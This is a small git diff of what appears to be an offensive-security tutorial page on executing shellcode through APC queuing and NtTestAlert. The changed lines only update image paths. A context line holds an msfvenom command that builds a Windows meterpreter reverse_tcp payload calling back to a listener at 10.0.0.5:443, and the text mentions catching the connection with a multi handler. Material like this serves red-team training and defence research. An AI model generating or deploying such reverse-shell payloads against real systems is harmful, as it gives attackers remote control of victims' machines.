@@ -24,11 +24,11 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c
 ```
 {% endcode %}
 
-![](../../.gitbook/assets/annotation-2019-05-27-191650.png)
+![](<../../.gitbook/assets/Annotation 2019-05-27 191650.png>)
 
 Short code that performs `NtTestAlert` function address resolution, memory allocation, shellcode writing to memory, APC queuing and `NtTestAlert` call:
 
-![](../../.gitbook/assets/annotation-2019-05-27-192952.png)
+![](<../../.gitbook/assets/Annotation 2019-05-27 192952.png>)
 
 Now, set up a multi handler for catching the incoming meterpreter connection:
 
